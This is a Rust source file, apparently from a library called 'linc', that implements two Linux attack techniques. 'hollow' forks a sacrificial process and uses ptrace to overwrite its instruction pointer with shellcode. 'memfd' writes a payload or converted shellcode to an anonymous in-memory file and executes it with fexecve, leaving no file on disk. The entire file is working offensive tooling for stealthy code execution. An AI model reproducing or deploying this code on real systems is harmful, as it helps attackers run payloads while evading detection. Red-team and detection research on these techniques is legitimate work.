//! Implements various process injection and fileless ELF execution techniques.

use std::ffi::{c_void, CString};
use std::os::fd::AsRawFd;

use nix::sys::memfd::{memfd_create, MemFdCreateFlag};
use nix::sys::ptrace;
use nix::sys::wait::waitpid;
use nix::unistd::{self, execve, fexecve, fork, ForkResult};

use crate::error::{Error, Result};
use crate::payload::{New, Payload, PayloadType};
use crate::utils::{get_env, str_to_vec_c_string};
use exeutils::elf64;

/// Uses [ptrace(2)](https://man7.org/linux/man-pages/man2/ptrace.2.html) to inject shellcode into a sacrificial process.
/// Only works with shellcode payloads.
///
/// # Errors
///
/// Returns an error if:
/// - The payload type is `Executable` (only shellcode is supported)
/// - Process creation or manipulation fails
/// - Memory operations fail
///
/// # Examples
///
/// ```no_run
/// use linc::payload::{Payload, PayloadResultExt, PayloadType};
/// use linc::techniques::hollow;
///
/// let shellcode = vec![/* bytes */];
///
/// let payload = Payload::from_bytes(shellcode, PayloadType::Shellcode)
///     .set_target("/usr/bin/yes")
///     .set_target_args("YES");
///
/// // Check if the payload was created successfully
/// if let Err(e) = payload {
///     eprintln!("Failed to create payload: {:?}", e);
///     return;
/// }
///
/// // Execute the payload using hollow
/// if let Err(e) = hollow(payload.unwrap()) {
///     eprintln!("An error occurred: {:?}", e);
/// }
/// ```
pub fn hollow(payload: Payload<New>) -> Result<()> {
    match unsafe { fork() } {
        Ok(ForkResult::Parent { child, .. }) => {
            waitpid(child, None)?;

            match payload.payload_type() {
                PayloadType::Executable => {
                    return Err(Error::NotImplemented(
                        "hollow can not take executables".to_string(),
                    ));
                }
                PayloadType::Shellcode => {
                    let regs = ptrace::getregs(child)?;

                    let mut addr = regs.rip;

                    for byte in payload.bytes() {
                        ptrace::write(child, addr as *mut c_void, i64::from(*byte))?;
                        addr += 1;
                    }

                    ptrace::detach(child, None)?;
                }
            }
        }

        Ok(ForkResult::Child) => {
            ptrace::traceme()?;

            let target_c_string = CString::new(payload.target())?;

            let target_args = str_to_vec_c_string(payload.target_args())?;
            let target_args_slice = target_args.as_slice();

            let env = get_env()?;
            let env_slice = env.as_slice();

            execve(&target_c_string, target_args_slice, env_slice)?;
        }

        Err(error) => return Err(Error::Linux(error)),
    }

    Ok(())
}

/// Uses [memfd_create(2)](https://man7.org/linux/man-pages/man2/memfd_create.2.html) to create an anonymous file in memory,
/// writes the payload to it, and executes it. Shellcode is converted to an ELF
/// before being executed.
///
/// # Errors
/// Returns an error if:
/// - Memory file creation fails
/// - Writing to the memory file fails
/// - Process creation fails
/// - Execution of the payload fails
///
/// # Examples
///
/// ```no_run
/// use linc::payload::{Payload, PayloadResultExt, PayloadType};
/// use linc::techniques::memfd;
///
/// let payload = Payload::from_file("/usr/bin/ls", PayloadType::Executable)
///     .set_args("-l -a -h");
///
/// // Check if the payload was created successfully
/// if let Err(e) = payload {
///     eprintln!("Failed to create payload: {:?}", e);
///     return;
/// }
///
/// // Execute the payload using memfd
/// if let Err(e) = memfd(payload.unwrap()) {
///     eprintln!("An error occurred: {:?}", e);
/// }
/// ```
pub fn memfd(payload: Payload<New>) -> Result<()> {
    let anon_file_name = CString::new("")?;
    let p_file_name = anon_file_name.as_c_str();

    let fd = memfd_create(p_file_name, MemFdCreateFlag::MFD_CLOEXEC)?;

    let bytes = match payload.payload_type() {
        PayloadType::Executable => payload.bytes().to_vec(),
        PayloadType::Shellcode => elf64::shellcode_to_exe(payload.bytes()),
    };

    unistd::write(&fd, &bytes)?;

    let args = str_to_vec_c_string(payload.args())?;
    let args_slice = args.as_slice();

    let env = get_env()?;
    let env_slice = env.as_slice();

    match unsafe { fork() } {
        Ok(ForkResult::Parent { child: _ }) => {}
        Ok(ForkResult::Child) => {
            fexecve(fd.as_raw_fd(), args_slice, env_slice)?;
        }
        Err(error) => return Err(Error::Linux(error)),
    }

    Ok(())
}
